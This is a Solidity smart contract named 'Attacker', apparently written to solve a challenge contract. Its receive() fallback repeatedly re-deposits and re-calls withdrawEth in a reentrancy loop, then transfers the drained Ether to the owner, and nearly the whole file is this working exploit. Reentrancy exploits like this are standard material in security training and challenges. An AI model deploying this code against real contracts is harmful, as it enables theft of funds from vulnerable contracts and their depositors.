// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IChallengeContract {
    function depositEth() external payable;
    function withdrawEth(uint256) external;
    function balances(address) external view returns (uint256);
    function totalShares() external view returns (uint256);
}

contract Attacker {
    IChallengeContract public target;
    address public owner;
    uint256 public attackCount;

    event Log(string message, uint256 value);

    constructor(address _target) payable {
        target = IChallengeContract(_target);
        owner = msg.sender;
    }

    function buyshare() public payable {
        uint256 contractBalance = address(this).balance;
        emit Log("Contract balance before deposit", contractBalance);

        require(contractBalance >= 1 ether, "Insufficient contract balance");

        target.depositEth{value: 1 ether}();

        contractBalance = address(this).balance;
        emit Log("Contract balance after deposit", contractBalance);
    }


    // Start the attack
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value > 0, "Need ETH to attack");

        // Deposit Ether into the target contract
        target.depositEth{value: msg.value}();

        // // Withdraw shares to initiate reentrancy
        // uint256 attackerShares = target.balances(address(this));
        // if (attackerShares > 0) {
        //     target.withdrawEth(attackerShares);
        // }
    }

    // Fallback function to handle reentrancy
    receive() external payable {
        attackCount++;

        emit Log("Received Ether", msg.value);
        emit Log("Attack Count", attackCount);

        if (attackCount < 10) {
            // Re-enter depositEth during withdrawal
            uint256 balance = address(this).balance;
            if (balance > 0) {
                target.depositEth{value: balance}();
                emit Log("Re-deposited Ether", balance);
            }

            // Withdraw shares again
            uint256 attackerShares = target.balances(address(this));
            if (attackerShares > 0) {
                target.withdrawEth(attackerShares);
                emit Log("Withdrew Shares", attackerShares);
            }
        } else {
            // Transfer the drained ETH to the owner
            uint256 contractBalance = address(this).balance;
            payable(owner).transfer(contractBalance);
            emit Log("Transferred Ether to Owner", contractBalance);
        }
    }
}
